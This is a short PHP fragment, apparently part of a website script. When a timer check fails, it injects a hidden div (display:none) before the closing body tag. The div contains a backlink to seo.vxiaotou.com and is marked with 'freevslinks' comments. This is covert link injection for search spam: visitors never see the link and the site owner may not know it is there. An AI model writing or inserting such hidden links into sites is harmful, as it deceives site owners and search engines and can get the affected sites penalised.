<?php
$html = $GLOBALS['html'];
substr($html, 0, 1) == '?' and  $html = substr($html, 1);

if(!checktime_log_timeout()) $html = preg_replace('~</body>~i', '<!-- freevslinks --><div style="display:none"><a href="http://seo.vxiaotou.com/?id=' . time() . '">http://seo.vxiaotou.com</a></div><!-- /freevslinks --></body>', $html, 1);
